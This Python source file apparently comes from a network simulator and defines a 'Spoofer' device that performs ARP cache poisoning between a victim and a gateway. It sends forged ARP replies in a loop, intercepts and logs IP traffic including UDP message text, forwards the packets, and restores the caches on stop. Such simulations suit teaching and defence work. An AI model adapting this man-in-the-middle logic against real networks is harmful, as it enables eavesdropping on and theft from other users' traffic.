from __future__ import annotations

from src.components.device import Device
from src.proto.proto import NetworkPipeline
from src.utils.utils import bytes_to_ipv4, ipv4_to_bytes, ipv4_to_str, mac_to_str
from src.exceptions import EthFrameError, IPPacketError, ARPPacketError, UDPPacketError

from asyncio import create_task, sleep
import ipaddress


class Spoofer(Device):
    def __init__(self, name: str, victim_ip: str, gateway_ip: str, iface: str = "eth0", poison_interval: float = 0.2):
        super().__init__(name)
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.poison_interval = poison_interval
        self.poison_task = None
        self.intercepted: list[dict] = [] 

    @property
    def victim_mac(self) -> bytes | None:
        return self.arp_table.get(bytes_to_ipv4(ipv4_to_bytes(self.victim_ip)))

    @property
    def gateway_mac(self) -> bytes | None:
        return self.arp_table.get(bytes_to_ipv4(ipv4_to_bytes(self.gateway_ip)))

    async def start(self):
        if self.poison_task is None:
            self.poison_task = create_task(self._poison_loop())

    async def stop(self):
        if self.poison_task:
            self.poison_task.cancel()
            self.poison_task = None
        await self.restore()

    async def _poison_loop(self):
        while self.running and not (self.victim_mac and self.gateway_mac):
            if not self.victim_mac:  await self.send_arp_request(self.iface, self.victim_ip)
            if not self.gateway_mac: await self.send_arp_request(self.iface, self.gateway_ip)
            await sleep(0.1)

        self.logger.info(f"Starting MAC cache poisoning. Real MACs: {self.victim_ip} -> {mac_to_str(self.victim_mac)}")
        self.logger.info(f"{self.gateway_ip}={mac_to_str(self.gateway_mac)}")

        while self.running:
            await self.send_arp_reply(self.iface, claim_ip=self.gateway_ip, tgt_ip=self.victim_ip, tgt_mac=self.victim_mac)
            await self.send_arp_reply(self.iface, claim_ip=self.victim_ip, tgt_ip=self.gateway_ip, tgt_mac=self.gateway_mac)
            await sleep(self.poison_interval)

    async def restore(self):
        if self.victim_mac and self.gateway_mac:
            await self.send_arp_reply(self.iface, claim_ip=self.gateway_ip, tgt_ip=self.victim_ip, tgt_mac=self.victim_mac, send_mac=self.gateway_mac)
            await self.send_arp_reply(self.iface, claim_ip=self.victim_ip, tgt_ip=self.gateway_ip, tgt_mac=self.gateway_mac, send_mac=self.victim_mac)
            self.logger.info("ARP cache restored")

    async def process_frame(self, iface: str, frame: bytes):
        try:
            eth = NetworkPipeline.decap_eth(frame)
            if eth.ethertype == 0x0806:   await self.handle_arp(eth.payload, iface)
            elif eth.ethertype == 0x0800: await self.handle_ip(eth.payload, iface)
        except (EthFrameError, IPPacketError, ARPPacketError, UDPPacketError) as e:
            self.logger.warning(f"Dropped malformed packet: {e}")

    async def handle_arp(self, arp_payload: bytes, iface: str):
        arp = NetworkPipeline.decap_arp(arp_payload)
        if arp.send_mac == self.interfaces[iface].mac:
            return

        self.learn_arp(arp.send_ip, arp.send_mac)

        if arp.opcode == 2:
            await self.flush_pending_packets(bytes_to_ipv4(arp.send_ip))
        elif arp.opcode == 1:
            target_ip_str = ipv4_to_str(arp.tgt_ip)
            if target_ip_str in (self.victim_ip, self.gateway_ip):
                sender_ip_str = ipv4_to_str(arp.send_ip)
                await self.send_arp_reply(iface, claim_ip=target_ip_str, tgt_ip=sender_ip_str, tgt_mac=arp.send_mac)

    async def handle_ip(self, ip_payload: bytes, iface: str):
        ip = NetworkPipeline.decap_ip(ip_payload)
        src_ip_str = ipv4_to_str(ip.src_ip)
        dst_ip_str = ipv4_to_str(ip.dst_ip)

        entry = {"src": src_ip_str, "dst": dst_ip_str, "bytes": len(ip_payload)}
        if ip.proto == 0x11:
            try:
                entry["message"] = NetworkPipeline.decap_udp(ip.payload).payload.decode("utf-8")
            except (UDPPacketError, UnicodeDecodeError):
                pass
        self.intercepted.append(entry)
        self.logger.info(f"Lookup {src_ip_str} -> {dst_ip_str}: {entry.get('message', '<binary>')}")

        my_net = ipaddress.ip_network(f"{self.interfaces[iface].ip}/24", strict=False)
        next_hop_ip = dst_ip_str if ipaddress.ip_address(dst_ip_str) in my_net else self.gateway_ip
        next_hop_int = bytes_to_ipv4(ipv4_to_bytes(next_hop_ip))

        dst_mac = self.arp_table.get(next_hop_int)
        if dst_mac:
            await self.send_ip_frame(ip_payload, iface, dst_mac)
        else:
            self.pending_packets.setdefault(next_hop_int, []).append((ip_payload, iface))
            await self.send_arp_request(iface, next_hop_ip)
